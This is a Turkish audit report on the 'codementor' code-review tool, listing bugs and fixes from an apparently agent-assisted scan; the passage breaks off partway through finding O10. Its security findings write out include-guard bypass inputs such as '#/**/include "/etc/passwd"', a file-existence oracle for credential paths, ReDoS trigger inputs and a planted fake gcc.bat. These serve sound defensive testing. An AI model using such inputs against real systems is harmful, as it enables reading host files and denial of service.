# Bulgular ve Düzeltilecekler — Tam Tarama (2026-10-12)

**Kapsam:** Tüm repo (`src/`, `web/`, `tests/`, `data/`, `prompts/`, `schemas/`, CI, paketleme, belgeler).
**Yöntem:** Dört bağımsız `kod-denetci` ajanı paralel tarama yaptı (güvenlik/API/web, LLM hattı,
statik analiz, masaüstü/CLI/dağıtım). Kritik iddialar ayrıca elle yeniden doğrulandı. Repoda
hiçbir dosya değiştirilmedi.
**Başlangıç durumu (main = `d42515c`):** `ruff` temiz, `ruff format` temiz (423 dosya),
`mypy --strict` temiz (198 dosya), `pytest -m "not live"` → **3127 geçti, 14 atlandı, 6 seçilmedi**
(143 sn).

**Doğrulama etiketleri:**
- ✅ **Elle doğrulandı**: ana oturumda komutla yeniden üretildi.
- 🔬 **Ajan doğruladı**: ajan küçük bir betik ya da FakeProvider ile çalıştırarak gösterdi.
- 📖 **Kod okumasıyla**: kod incelenerek tespit edildi, çalıştırılmadı.
- ❓ **Doğrulanmadı**: olası; kontrol edilmeli.

**Önem:** 🔴 Kritik · 🟠 Yüksek · 🟡 Orta · 🟢 Düşük

---

## İçindekiler

1. [Özet tablo](#1-özet-tablo)
2. [Kritik](#2-kritik)
3. [Yüksek](#3-yüksek)
4. [Orta](#4-orta)
5. [Düşük](#5-düşük)
6. [Public yayın hazırlığı](#6-public-yayın-hazırlığı)
7. [Sağlam bulunanlar](#7-sağlam-bulunanlar)
8. [Eksik testler](#8-eksik-testler)
9. [Eklenmesi önerilen özellikler](#9-eklenmesi-önerilen-özellikler)
10. [Faz planı (A-J)](#10-faz-planı-a-j)
11. [Tarama sırasındaki yan etkiler](#11-tarama-sırasındaki-yan-etkiler)

---

## 1. Özet tablo

| Kimlik | Önem | Alan | Başlık | Doğrulama | 18 Ekim öncesi? |
|---|---|---|---|---|---|
| K1 | 🔴 | Tier 1 güvenlik | Include koruması `#/**/include` ile atlatılıyor | ✅ | Evet |
| K2 | 🔴 | API / ingest | Dil tespitinde kübik ReDoS + 6 karesel desen, olay döngüsünü kilitliyor | ✅ | Evet |
| Y1 | 🟠 | Tier 1 güvenlik | Windows'ta çalışma dizinindeki sahte derleyici seçilebiliyor | 🔬 (koşullu) | Evet (Faz A2) |
| Y2 | 🟠 | Gizlilik | Repoda referans çözüm olabilir (`unity03_reference.cs`) | ❓ | Evet |
| Y3 | 🟠 | Pipeline | Onarım döngüsü doğrulanmış bulguları atıyor | 🔬 | Evet (Faz B) |
| Y4 | 🟠 | Pipeline | Geçiş B hatası Geçiş A'yı da atıyor | 📖 | Evet (Faz B) |
| Y5 | 🟠 | Önbellek | Fallback raporu birincil sağlayıcının anahtarıyla saklanıyor | 📖 | Evet (Faz B) |
| Y6 | 🟠 | İpucu merdiveni | Masaüstü kavram adını her seviyede gösteriyor; API/JSON da veriyor | ✅ | Evet |
| Y7 | 🟠 | Masaüstü | toml yazıcısı kullanıcı ayarını siliyor, atomik değil | 🔬 | Evet (Faz C) |
| Y8 | 🟠 | Masaüstü (exe) | toml yokken yapılandırma konumu ve yeniden yükleme yanlış | 📖 | Evet (Faz C) |
| Y9 | 🟠 | CLI | Sistem hatası 1 çıkış koduyla dönüyor (bulgu ile karışıyor) | 🔬 | Evet (Faz C) |
| O1 | 🟡 | Belgeler / web | Faz 62 belgesi yapılmamış web/toplu silmeyi yapıldı diyor | ✅ | Evet (belge) |
| O2 | 🟡 | Pipeline | `single_pass` doğrulanmamış bulgudan soru üretiyor | 🔬 | Evet |
| O3 | 🟡 | Önbellek | Anahtarda `tier1`, `rules.disabled`, prompt ayarları yok | 📖 | Evet (Faz B) |
| O4 | 🟡 | Önbellek | Önbellekten dönen raporda eski `cost_est` | 🔬 | Evet (Faz B) |
| O5 | 🟡 | Sağlayıcılar | CLI ajan çıktısı 64 KB'de kesiliyor, sonuç olayı kayboluyor | ❓ | Evet (Faz G1) |
| O6 | 🟡 | Sağlayıcılar | Kalıcı CLI hataları 3 kez yeniden deneniyor | ✅ | G2 |
| O7 | 🟡 | Config | BOM'lu toml uygulamayı tamamen durduruyor | ✅ | Evet |
| O8 | 🟡 | Config | `.env` hiç okunmuyor; `.env.example` eski | ✅ | Evet |
| O9 | 🟡 | Paketleme | Wheel'e varsayılan toml girmiyor | 📖 | Evet (Faz C) |
| O10 | 🟡 | Masaüstü | Bozuk veritabanında exe hiç açılmıyor | 📖 | Evet (Faz F) |
| O11 | 🟡 | CLI | Kök `--help` Türkçe karakterleri bozuk basıyor | 🔬 | Evet |
| O12 | 🟡 | CLI | `toolchain` ve `eval compare` traceback veriyor | 🔬 | Evet (Faz C) |
| O13 | 🟡 | Masaüstü | Dışa aktarma hatası sessiz | 📖 | Evet (Faz F) |
| O14 | 🟡 | Gizlilik | "Geçmişi temizle" sonrası kod veritabanı dosyasında kalıyor | 📖 | Evet (Faz F) |
| O15 | 🟡 | Web güvenlik | Monaco hover güvenilmeyen markdown işliyor | 📖 | Evet (Faz E) |
| O16 | 🟡 | Web / API | CSP ve güvenlik başlıkları yok | 📖 | Evet (Faz E) |
| O17 | 🟡 | CI | Etiketle release yok, `permissions` yok, duman testi yok | 📖 | Evet (release; Faz D) |
| O18 | 🟡 | Sürüm | v0.1.0 main'in gerisinde; sürüm iki yerde | ✅ | Evet |
| D1-D20 | 🟢 | Çeşitli | Bkz. §5 (tamamı ✅; D20 satırı kapanış denetiminde güncellendi) | ✅ | Bitti (C/E/F/G) |

---

## 2. Kritik

### K1 — Include koruması yorumla atlatılıyor 🔴 ✅

- **Dosya:** `src/codementor/validation/include_guard.py:109` (`_check_line`, `_KEYWORD.finditer(raw)`)
- **Ne yanlış:** `_KEYWORD = (?:#|%:)[ \t\f\v]*(include|import|embed|pragma…)` yönergeyi yalnız
  **ham** metinde arıyor ve `#` ile anahtar sözcük arasında yalnız boşluk kabul ediyor. C/C++
  çeviri aşaması 3'te yorumlar tek boşluğa dönüştüğü için `#/**/include "yol"` geçerli bir
  yönergedir; koruma onu görmüyor.
- **Elle doğrulama:**
  ```
  '#include "/etc/passwd"'        → reddedildi (doğru)
  '#/**/include "/etc/passwd"'    → TEMİZ (yanlış)
  '%:/**/include <x>'             → TEMİZ (yanlış)
  '#/*\n*/include "/etc/x"'       → TEMİZ (yanlış)
  ```
- **Uçtan uca (ajan, zig clang ile):** `run_tier1` derleyiciyi çağırdı; derleyici mutlak yoldaki
  dosyayı **okudu**.
- **Etki:**
  - ADR-0009 / mimari §12 "derleyici host dosya sistemine erişmez" garantisi delinmiş.
  - **Dosya varlığı kahini:** var olan dosya → `tool_error` ("beklenmedik çıktı"); olmayan dosya →
    `warning` "başlık bulunamadı; {yol}". Öğrenci sunucuda herhangi bir yolun var olup olmadığını
    öğrenebiliyor (`~/.ssh/id_rsa`, `C:/Windows/win.ini`…).
  - **Hafifletici:** `diagnostics.py:23` yalnız `<stdin>:` satırlarını aldığı için dosya
    **içeriği** kullanıcıya dönmüyor.
- **Kök neden:** `mask_non_code('#/**/include ...')` → `'#    include ...'` maskede eşleşiyor,
  ama kod `_KEYWORD`'ü yalnız `raw` üzerinde çalıştırıyor.
- **Düzeltme:**
  1. Anahtar sözcük taramasını **maskelenmiş** satırda da yap. Maskede yönerge bulunup hamda
     bulunmuyorsa fail-closed reddet (maskede hedef boşluğa döndüğü için `_unsafe_path` "boş yol"
     verir ve red zaten doğal sonuç olur).
  2. Satırlar arası yorum (`#/*\n*/include`) için maskeleme dosya düzeyinde yapılmalı, satır satır
     değil.
- **Testler:** `tests/unit/test_include_guard.py` REJECTED kümesine `#/**/include "…"`,
  `%:/**/include <…>`, `#/*\n*/include "…"`, `# /* a */ include`, `#/**//**/include` ekle.
  `compiler` işaretli uçtan uca bir regresyon testi: yönerge Tier 1'e ulaşmadan reddedilmeli.

### K2 — Dil tespitinde ReDoS 🔴 ✅

- **Dosya:** `src/codementor/ingest/detect.py:133`
  ```python
  r"^\s*-{0,2}[a-z][a-z-]*\s*:\s*[^;{}()=]*[^;{}]*;\s*$"
  ```
- **Ne yanlış:** `\s*`, `[^;{}()=]*` ve `[^;{}]*` aynı karakterleri (boşluk) yakalayabiliyor;
  sonda `;` yoksa geri izleme kübik büyüyor. Ayrıca `[^;{}]` `\n`'yi de yuttuğu için `re.M`
  altında desen satır sınırını aşıyor (ayrı bir doğruluk hatası).
- **Elle doğrulama** (`normalize("a:" + " " * N)`, dil verilmeden):

  | N | Süre |
  |---|---|
  | 500 | 0,06 sn |
  | 1000 | 0,41 sn |
  | 2000 | 3,29 sn |
  | 4000 (ajan) | 25,6 sn |
  | 40 000 (ajan) | 300 sn'de bitmedi; tahmin saatler |

- **Etki:**
  - Tespit yalnız `language` verilmediğinde çalışıyor; API'de bu alan isteğe bağlı.
  - `Orchestrator._ingest` (`pipeline/orchestrator.py:122`, `:222`) olay döngüsünde **senkron**
    çağrılıyor → tüm uvicorn süreci donuyor (`/health` dahil), `analysis_timeout_s` devreye
    giremiyor, eşzamanlılık yuvası tutulu kalıyor.
  - Gövde sınırı, Host denetimi ve API anahtarı engellemiyor (~40 KB geçerli bir gövde yetiyor).
  - CLI ve masaüstünde zararlı bir dosya açmak uygulamayı donduruyor.
- **Düzeltme:**
  1. Deseni değiştir (ajan denedi: 40 KB'de 0,2 ms; `color: red;` ve `--x: #fff;` hâlâ
     eşleşiyor):
     ```python
     r"^[ \t]*-{0,2}[a-z][a-z-]*[ \t]*:[^;{}\n]*;[ \t]*$"
     ```
  2. `_ingest`'i `asyncio.to_thread` içine al ve süre sınırına dahil et.
  3. `detect.py`'deki **tüm** sinyal desenlerini, ayrıca `analysis/` ve `rules/` içinde kullanıcı
     koduna uygulanan regex'leri aynı gözle tara (ajan bunları taramadı).

**Ek ölçüm (2026-10-12, ana oturum, elle) — aynı dosyada karesel desenler:**
Çok satırlı modda (`re.M`) `^\s*` ile başlayan desenlerde `\s` satır sonunu da yakalıyor; motor her
satır başından yeniden tarıyor ve süre karesel büyüyor. Girdi `" \n" * N` (boşluk + satır sonu):

| Desen (`detect.py`) | 20 KB | 40 KB |
|---|---|---|
| `^\s*[\w.#:*…]+\{\s*$` (CSS "seçici {", satır 132) | 1,59 sn | 6,44 sn |
| `^\s*(?:if\|elif\|for…)[^;{}]*:…` (Python blok başlığı, satır 108) | 1,09 sn | 5,24 sn |
| `^\s*(?:from…import\|import…)(?!.*;\s*$)` (Python import, satır 106) | 0,46 sn | 1,86 sn |
| `^\s*def\s+\w+…` (Python def, satır 105) | 0,19 sn | 0,73 sn |
| `^\s*elif` (satır 115) | 0,20 sn | 0,75 sn |
| `^\s*<!DOCTYPE\s+html` (satır 120) | 0,19 sn | 0,77 sn |

Hepsi tek analizde art arda çalıştığı için 40 KB'lik bu girdide toplam **~16 sn** olay döngüsü
kilidi (CSS özellik deseninin kübik saatlerine ek olarak).
`_LANGUAGE_SIGNALS` içindeki `^\s*(?:public|private|protected)\s*:` ve `^\s*using …` desenleri
de aynı yapıda (maskelenmiş metinde çalışıyor; ayrıca ölçülmeli).

- **Ek düzeltme:** satır başı boşluğu için `^\s*` yerine `^[ \t]*`; satır içinde kalması gereken
  karakter sınıflarına `\n` ekle (`[^;{}]` → `[^;{}\n]`). `_s()` yardımcısına `re.M` desenlerinde
  `^\s*` kullanımını reddeden bir doğrulama (ya da testte tüm desenleri tarayan bir denetim).
- **Aynı yapıda, taranacak diğer desenler:** `analysis/_recursion.py:21` (`^\s*…\s*$`, IGNORECASE),
  `verify/lines.py:20`, `verify/proof.py:50`. Bunlar kısa metinlere (ifade, LLM satırı)
  uygulandığı için büyük olasılıkla zararsız; girdi uzunlukları doğrulanmalı.
- **Testler:** her sinyal deseni için en kötü durum girdileri (uzun boşluk, `a:` + boşluk,
  tekrar eden `-`, `:` dizileri) ile `perf_counter` < 50 ms bütçeli test; hypothesis ile rastgele
  girdi üretip süre bütçesi.

---

## 3. Yüksek

### Y1 — Windows'ta çalışma dizinindeki sahte derleyici 🟠 🔬 (koşullu) ✅ Faz A2

- **Dosya:** `src/codementor/validation/toolchain.py:51` (`_which` → `shutil.which(name, path=PATH)`)
- **Ne yanlış:** `run_process` (`runner.py:237`) çıplak/göreli `argv[0]`'ı reddediyor, ama keşif
  aşamasında `shutil.which` Windows'ta `NoDefaultCurrentDirectoryInExePath` ayarlı değilse
  çalışma dizinini PATH'in başına ekliyor. Bulunan yol `resolve()` ile mutlak yapıldığı için
  runner'ın savunması da aşılıyor.
- **Senaryo (ajan):** çalışma dizininde `gcc.bat` varken, `NoDefaultCurrentDirectoryInExePath`
  kaldırılmış kabukta `get_toolchain(...).c.command` bu dosyayı seçti; çalıştırınca
  `stdout='pwned'`. `codementor analyze` kötü niyetli dosya içeren bir dizinden çalıştırılırsa
  keyfi kod yürütülür. (Ajanın varsayılan ortamında değişken ayarlı olduğu için ilk deneme
  `None` döndü; istismar ortama bağlı.)
- **Neden `shutil.which(path=...)` yetmiyor:** Python 3.12'de Windows'ta `path` verilse bile
  `NeedCurrentDirectoryForExePathW` true dönerse çalışma dizini başa ekleniyor.
- **Düzeltme:** projede bunun güvenli çözümü **zaten var**: `providers/_cli_common.py`
  `_candidates()` yalnız PATH'teki **mutlak** dizinleri `PATHEXT` ile geziyor, çalışma dizinini hiç
  denemiyor (Claude/Codex/agy CLI'ları için yazılmış). Bu mantık ortak bir yardımcıya çıkarılıp
  (ör. `validation/runner.py`'de `find_on_path(name, search_path)`) `toolchain._which` ve
  `_candidates` aynı fonksiyonu kullanmalı. `toolchain.py`'de `_which`'in üç çağrısı var
  (satır 69 gcc/clang, 164 zig, 175 dotnet).
- **Test:** geçici dizine sahte `gcc.bat`/`gcc` koy, `chdir` et, keşfin onu seçmediğini doğrula.

### Y2 — Repoda referans çözüm olabilir 🟠 ❓

- **Dosya:** `tests/fixtures/llm_responses/unity03_reference.cs`
- **Ne yanlış:** Golden `unity-03` ("EnemyRadar") için tam bir çözüm git'te izleniyor. Repo public
  olunca bu sorunun çözümü açılır.
- **Doğrulanmadı:** `private/` erişimi izinle kapalı olduğu için bankadaki referans çözümle aynı mı
  bilinmiyor. **Kullanıcı kontrol etmeli.**
- **Düzeltme:** aynıysa ya da çok benziyorsa fixture'ı bankada olmayan bir soruya ait yapay bir
  çözümle değiştir. Sonra golden'ları yeniden üret. Git geçmişinde de durduğu için gerekirse ilgili
  soruyu bankada değiştirmek daha kolay olabilir.

### Y3 — Onarım döngüsü doğrulanmış bulguları atıyor 🟠 🔬 ✅ Faz B

- **Dosya:** `src/codementor/pipeline/passes.py:122-147`
- **Ne yanlış:** İlk yanıt şemaya uyuyor ve bulgular kanıtla doğrulanıyor. Ama karmaşıklık statik
  ipucuyla gerekçesiz çelişirse (`unjustified_conflict`) onarım isteniyor. Onarım yanıtı bozuk
  gelirse ya da çelişki sürerse `PassA(None, None)` dönüyor; rapor tamamen `degraded` oluyor.
  Oysa `_complexity_result` (`verify/analysis.py:117`) bu durumda zaten yalnız karmaşıklığı
  `None` yapmaya hazır.
- **Probe:** `analysis_reply(time="O(n^3)")` + `FakeReply(raw="bozuk")` → `degraded=True`;
  31. satırdaki doğrulanmış LLM bulgusu kayboldu.
- **Düzeltme:** son geçerli `parsed` + `verification` saklansın. Onarım başarısızsa ve kalan hata
  yalnız karmaşıklıksa: bulgular korunur, `complexity=None`, uyarı eklenir. Şema hatasıyla biten
  onarımda en son geçerli `parsed` kullanılır.
- **Test:** ilk yanıt geçerli + çelişkili karmaşıklık + bozuk onarım → bulgular raporda,
  `complexity` boş, `degraded=False`, uyarı var.

### Y4 — Geçiş B hatası Geçiş A'yı da atıyor 🟠 📖 ✅ Faz B

- **Dosya:** `src/codementor/pipeline/orchestrator.py:351-355` (`run_llm_passes`)
- **Ne yanlış:** her `ProviderError`, `PromptBudgetError` ve `PromptConfigError` tüm sonucu
  `LLMOutcome(None, None)` yapıyor. Geçiş B'de 429, ağ hatası ya da `build_socratic_messages`
  bütçe hatası doğrulanmış bulguları da siliyor; token boşa harcanıyor. PROGRESS Sonraya'daki
  "süre Geçiş B sırasında dolarsa…" maddesinin genel hâli.
- **Düzeltme:** Geçiş B'yi ayrı `try` bloğuna al; hata olursa
  `LLMOutcome(verification, None, [uyarı])` dön. Öğrenci şablon sorular alır, bulgular korunur.
  Zaman aşımı yolu da aynı kısmi sonucu döndürsün.
- **Test:** Geçiş A başarılı, Geçiş B `ProviderUnavailableError` / `PromptBudgetError` /
  zaman aşımı → bulgular raporda, Sokratik kısım şablon, uyarı var.

### Y5 — Fallback raporu birincil sağlayıcının önbellek anahtarıyla saklanıyor 🟠 📖 ✅ Faz B

- **Dosya:** `orchestrator.py:162`, `_cache_key` (`orchestrator.py:251-266`),
  `storage/cache.py:107-147`
- **Ne yanlış:** anahtar `run.provider_name` + birincil sağlayıcının modeliyle kuruluyor. Yanıtı
  fallback (ör. yerel Ollama 7B) vermiş olabilir; rapor `degraded` olmadığı için önbelleğe giriyor.
- **Senaryo:** `claude_cli` anlık düştü, Ollama yanıt verdi. Claude düzelse de aynı kod için
  Ollama'nın raporu dönüyor.
- **Benzerleri:** Geçiş B'nin şablona düştüğü raporlar ve `VERIFY_FAILED` uyarılı raporlar da
  önbelleğe giriyor; kısmi sonuç kalıcılaşıyor.
- **Düzeltme:** `meta.provider` anahtardaki sağlayıcıdan farklıysa ya da LLM'in bir kısmı başarısız
  olduysa (fallback uyarısı, Sokratik şablon, doğrulama hatası) kaydı önbelleğe alma
  (`cache_key=None` ya da `cacheable=False` bayrağı).
- **Test:** birincil hata + fallback yanıtı → ikinci istek önbellekten dönmez.

### Y6 — İpucu merdiveni: kavram adı her seviyede açık 🟠 ✅ ✅ Faz C

- **Dosyalar:**
  - `src/codementor/desktop/widgets/socratic_card.py:58` → `result.key_flaw_concept` koşulsuz,
    kalın başlık olarak basılıyor (elle doğrulandı).
  - `report/cli_render.py:106` ve `report/markdown.py:80` → yalnız `hint_level >= 3` iken
    gösteriyor. Arayüzler arasında tutarsızlık var.
  - `models/report.py:31`, `verify/analysis.py:205-217, 233` → API yanıtı ve web "JSON indir"
    (`web/src/components/ReportDownload.tsx:31`) seviye 1'de bile alanı veriyor.
- **Ne yanlış:** prompt `name_concept=False` iken (orta/zor soruda ilk deneme) kavram adını yalnız
  bu alana yazmasını söylüyor. Bu 80 karakterlik alan çözümü ele verebilir ("unordered_set ile
  O(1) arama") ve `check_leaks` denetimine girmiyor. Mimari §5.4.3 ihlali.
- **Düzeltme:** gösterim kuralı tek yerde dursun (`SocraticResult.concept_revealed: bool` ya da
  seviye < 3'te API'de alanı boş/maskeli döndür). Masaüstü, web, CLI, Markdown aynı bayrağı
  kullansın. `key_flaw_concept` `check_leaks` hedeflerine eklensin.
- **Test:** seviye 1 ve 2'de masaüstü kartı, API yanıtı ve JSON indirmesinde kavram yok; seviye
  3'te var. Sızıntılı kavram adı yakalanıyor.

### Y7 — toml yazıcısı kullanıcı ayarını siliyor 🟠 🔬 ✅ Faz C

- **Dosya:** `src/codementor/desktop/config_writer.py:18-24, 42`
- **Ne yanlış (ajan scratchpad'de doğruladı):**
  - `providers = { default="ollama", fallback=["anthropic"] }` (satır içi tablo) → yazım sonrası
    `[providers]\ndefault = "claude_cli"`; `fallback` **kayboluyor**.
  - Nokta anahtarlı `providers.fallback = ["x"]` de aynı şekilde kayboluyor.
  - Yazım `write_text` ile doğrudan, atomik değil; yarıda kesilirse toml bozuluyor
    (`runtime.save_prefs` ise temp + `os.replace` kullanıyor).
- **Düzeltme:** mevcut `Table` / `InlineTable` / super-table'ı yerinde güncelle; anahtar yoksa
  ekle, varsa yalnız değeri değiştir. Temp dosya + `os.replace` ile atomik yaz.
- **Test:** satır içi tablo, nokta anahtarı, yorumların korunması, BOM'lu dosya, yazım sırasında
  istisna (eski dosya bozulmamalı).

### Y8 — Exe'de yapılandırma konumu ve yeniden yükleme yanlış 🟠 📖 ✅ Faz C

- **Dosyalar:** `src/codementor/desktop/app.py:443-449, 464`, `desktop/runtime.py:44-74`
- **Ne yanlış:** exe'nin yanında `codementor.toml` yokken `CONFIG_FILE_ENV` ayarlanmıyor ve
  çalışma dizini `_MEIPASS` oluyor.
  - Bağlantılar ekranındaki "Yapılandırma" konumu geçici dizindeki toml'u gösteriyor; kullanıcı
    "klasörü aç" ile onu düzenlerse onefile exe kapanınca değişiklik siliniyor.
  - "toml'a yaz" dosyayı exe'nin yanına oluşturuyor, ama `reload_config` paketteki toml'u okumaya
    devam ediyor; yazılan dosya yeniden başlatmaya kadar yok sayılıyor.
- **Düzeltme:** `writable_config_file()` kopyalamadan sonra `os.environ[CONFIG_FILE_ENV]`'i
  ayarlasın; `_locations` aynı yolu göstersin.
- **Test:** toml'suz exe senaryosu: yaz → yeniden yükle → yeni değer okunuyor; gösterilen konum
  yazılan dosya.

### Y9 — CLI sistem hatasında 1 dönüyor 🟠 🔬 ✅ Faz C

- **Dosya:** `src/codementor/cli/analyze.py:93, 157-171`
- **Ne yanlış:** veritabanı açılamazsa ya da `--out` yazılamazsa yakalanmamış traceback çıkıyor ve
  çıkış kodu **1** oluyor. Mimari §10'da 1 = "yüksek önemli bulgu var". CI kullanan biri sistem
  hatasını bulgu sanır. Ajan geçersiz `CODEMENTOR_DB_PATH` ile `FileExistsError` + exit=1'i
  doğruladı. Ayrıca `out.open("w")` (satır 164) kapatılmıyor.
- **Düzeltme:** `OSError`, `SQLAlchemyError`, `RuntimeError` yakalanıp Türkçe mesaj +
  `EXIT_SYSTEM_ERROR` (3). Dosyayı `with` ile aç.
- **Test:** geçersiz DB yolu, yazılamayan `--out` → çıkış 3, traceback yok.

---

## 4. Orta

### O1 — Faz 62 belgesi gerçeği yansıtmıyor 🟡 ✅ ✅ Faz D

- **Dosya:** `docs/GUNCELLEMELER.md` Faz 62 bölümü.
- **Ne yanlış:** "API: `DELETE /v1/analyses/{id}` **ve toplu silme**; **web arayüzünde aynı
  düğmeler**" maddesi [x] işaretli. Kodda:
  - Yalnız tekil `DELETE /v1/analyses/{id}` var (`api/routes.py:216`).
  - Toplu silme ucu yok.
  - Analizleri listeleyen `GET /v1/analyses` ucu yok.
  - Web'de geçmiş ekranı da silme düğmesi de yok (`web/src/api/client.ts` silme çağırmıyor).
  - PROGRESS "Faz 62 — Notlar" doğru (yalnız tekil silme), ama GUNCELLEMELER yanlış.
- **Düzeltme:** ya belgeyi düzelt (madde açık kalsın) ya da web geçmiş/silme özelliğini yap
  (§9 Web).

### O2 — `single_pass` doğrulanmamış bulgudan soru üretiyor 🟡 🔬 ✅ Faz B

- **Dosya:** `src/codementor/pipeline/passes.py:293-307`
- **Ne yanlış:** tek geçişin soruları (`first`) yalnız doğrulama geçişi bulgu düşürürse
  sıfırlanıyor. K5 satır/kanıt kontrolünün attığı bulgular ve `verify_findings=false` bunu
  tetiklemiyor.
- **Probe:** bulgunun kanıtı `hayali_satir();` → bulgu raporda yok, ama soru "hayali_satir çağrısı
  neden tehlikeli olabilir?" olarak geldi. Mimari §5.4.2 "doğrulanmamış bulgular soruya
  dönüşmez" ile çelişiyor.
- **Düzeltme:** `len(verified) < len(output.additional_findings)` olduğunda da `first = None`;
  ayrı Geçiş B'ye gidilsin.
- **Test:** `single_pass` + kanıtsız bulgu → ikinci çağrı yapılıyor, sorular yalnız doğrulanmış
  bulgulara dayanıyor.

### O3 — Önbellek anahtarı çıktıyı etkileyen ayarları içermiyor 🟡 📖 ✅ Faz B

- **Dosya:** `orchestrator.py:271-274` (`_pipeline_signature`)
- **Anahtarda olmayanlar:**
  - `rules.disabled`, `rules.max_findings`
  - `prompts.include_facts`, `numbered_code`, `max_fewshots`, `max_checklist_items`
  - `verify.*` eşikleri, `pipeline.max_repair_attempts`
  - **İsteğin `options.tier1` değeri ve derleyicinin kurulu olup olmadığı / sürümü**
- **Senaryo:** Tier 1 kapalıyken (ya da derleyici yokken) yapılan analiz önbelleğe giriyor; sonra
  derleyici kuruluyor, aynı kod için derleme denetimi yapılmamış eski rapor dönüyor. Kuralı
  kapatan kullanıcı o kuralın bulgusunu görmeye devam ediyor.
- **Eval'i etkilemiyor:** eval her zaman `use_cache=False`.
- **İlgili bilinenler:** PROGRESS Sonraya (soru içeriği anahtarda yok; derleyici sürümü imzada yok).
- **Düzeltme:** imza = `Settings`'in çıktıyı etkileyen alt kümesinin hash'i + Tier 1 etkin mi +
  derleyici kimliği/sürümü + soru içeriği özeti.
- **Test:** `options.tier1`, `rules.disabled` ya da prompt bayrağı değişince önbellek ıskalanıyor.

### O4 — Önbellekten dönen raporda eski maliyet 🟡 🔬 ✅ Faz B

- **Dosyalar:** `pipeline/assemble.py:86-101` (`from_cache`), `orchestrator.py:168-169`
- **Ne yanlış:** `from_cache` token sayılarını sıfırlıyor ama `cost_est`'i önceki koşudan
  kopyalıyor.
- **Probe:** ilk koşu `cost_est=0.002385`; önbellek dönüşü `cache_hit=True`, `tokens=0`,
  `cost_est=0.002385`. Masaüstü/web harcanmamış parayı gösteriyor.
- **Düzeltme:** `from_cache` içinde `cost_est=None`, `usage_estimated=False`.
- **Test:** önbellek dönüşünde `cost_est is None`.

### O5 — CLI ajan çıktısı 64 KB'de kesiliyor 🟡 ❓ ✅ Faz G1

- **Dosyalar:** `validation/runner.py:37` (`OUTPUT_LIMIT`), `providers/cli_agent.py:257-260`,
  `providers/codex_cli.py:205-209`
- **Ne yanlış:** agy `stream-json` ve codex `--json` her parça/olay için ayrı satır yazıyor; sonuç
  olayı en sonda. Okuyucu ilk 64 KB'yi tutuyor. Uzun yanıtta `result_event` `None` olur, hata
  "çıktı boyutu sınırı aşıldı" diye döner, `first_response_text` geri dönüşüne hiç ulaşılmaz.
  Canlı doğrulanmadı.
- **Düzeltme:** `ProcessLimits.output_limit` alanı; CLI ajanları için config'den (ör. 2 MB). Ya da
  akış biçiminde baş yerine son N bayt tutulsun.
- **Test:** 64 KB'yi aşan sahte akış çıktısı → sonuç olayı okunuyor.

### O6 — Kalıcı CLI hataları yeniden deneniyor 🟡 📖 ✅ G2

- **Dosya:** `providers/cli_agent.py:313-316, 345`
- **Ne yanlış:** agy'nin "yanıt boş; oturum açık mı?" hatası (MCP takılması dahil) ve Claude'un
  bilinmeyen `subtype` hataları (ör. `error_max_structured_output_retries`)
  `ProviderUnavailableError` olduğu için yeniden denenebilir sayılıyor. Kalıcı bir oturum veya
  yapılandırma hatası için CLI 3 kez açılıyor (agy'de her biri ~20 sn).
- **Düzeltme:** `_cli_common.CliPermanentError(ProviderUnavailableError)` (`retryable = False`);
  agy boş yanıtı ve deterministik Claude `subtype`'ları (`error_max_structured_output_retries`,
  `error_max_budget_usd`, `error_max_turns`) bu tipten döner. Oturum/kimlik ipuçları
  (`auth_error`) `ProviderConfigError` ile kalıcıdır. Sıradan/ağ benzeri hatalar eskisi gibi
  yeniden denenir (sözleşme testi korunuyor).
- **Test:** `tests/providers/test_cli_agent.py`: `test_agy_empty_response_is_not_retried`,
  `test_claude_permanent_subtype_is_not_retried`, `test_claude_unknown_subtype_is_retried`,
  `test_logged_out_result_is_not_retried`, `test_logged_out_stderr_is_not_retried`,
  `test_server_error_is_still_retried`.

### O7 — BOM'lu toml uygulamayı durduruyor 🟡 ✅ ✅ Faz C

- **Dosya:** `src/codementor/config.py:301` (`_RelativeTomlSource`)
- **Ne yanlış:** `tomllib` BOM'u reddediyor (elle doğrulandı: `TOMLDecodeError`). Not Defteri'nde
  "UTF-8 BOM" ile kaydedilen toml masaüstünü ve CLI'ı tamamen durduruyor; `config_writer` ise
  `EmptyKeyError` veriyor.
- **Düzeltme:** okumada `removeprefix("\ufeff")`; `config_writer` de aynı şekilde okuyup BOM'suz
  yazsın.
- **Test:** BOM'lu toml okunuyor ve yazılıyor.

### O8 — `.env` okunmuyor, `.env.example` eski 🟡 ✅ ✅ Faz C

- **Dosyalar:** `.env.example`, `src/codementor/config.py:298` (`settings_customise_sources`)
- **Ne yanlış:**
  - `dotenv_settings` döndürülmüyor, `env_file` tanımlı değil → `.env` **hiç yüklenmiyor**. Anahtarı
    `.env`'ye yazan kullanıcı "neden çalışmıyor" diye kalır.
  - `OPENAI_API_KEY`, `DEEPSEEK_API_KEY` Faz 37'de kaldırılan sağlayıcılara ait; `GEMINI_API_KEY`
    ve `CODEMENTOR_API_KEY` eksik.
- **Düzeltme:** iki seçenek: (a) `.env` desteği ekle (`env_file=".env"`, toml'un dizinine göre); (b)
  dosya başına "ortam değişkeni olarak ayarlayın; .env otomatik yüklenmez" yaz. Her durumda değişken
  listesini güncelle.

### O9 — pip ile kurulumda varsayılan toml yok 🟡 📖 ✅ Faz C

- **Dosya:** `pyproject.toml:63-66` (`force-include`)
- **Ne yanlış:** wheel'e `codementor.toml` girmiyor. `pip install` / `uv tool install` kullanıcısında:
  - varsayılan sağlayıcı `ollama` oluyor (repoda `claude_cli`);
  - `zig.sources` boş, `toolchain install zig` "tanımlı değil" hatası veriyor;
  - `codementor-desktop` çalışma dizinini `site-packages/codementor/_resources`'a alıyor
    (`runtime.py:74`); "toml'a yaz" **paket dizinine** yazıyor (`runtime.py:60`).
- **Düzeltme:** varsayılan toml'u `_resources`'a ekle. Frozen olmayan masaüstünde yazma ve okuma
  için `~/.codementor/codementor.toml` kullan.
- **Test:** wheel'i geçici venv'e kur, `codementor providers` varsayılanı `claude_cli`.

### O10 — Bozuk veritabanında exe açılmıyor 🟡 📖 ✅ Faz F

- **Dosya:** `src/codementor/desktop/launch.py:32-33`
- **Ne yanlış:** `state.database()` korumasız. Bozuk ya da kilitli `codementor.db` ("file is not a
  database") olunca pencereli exe hiç açılmıyor; hata yalnız `desktop.log`'a gidiyor. Tk'de
  `report_callback_exception` tanımlı değil (beklenmeyen istisnalar sessiz).
- **Düzeltme:** `messagebox` ile Türkçe hata + "veritabanını yedekleyip sıfırla" seçeneği;
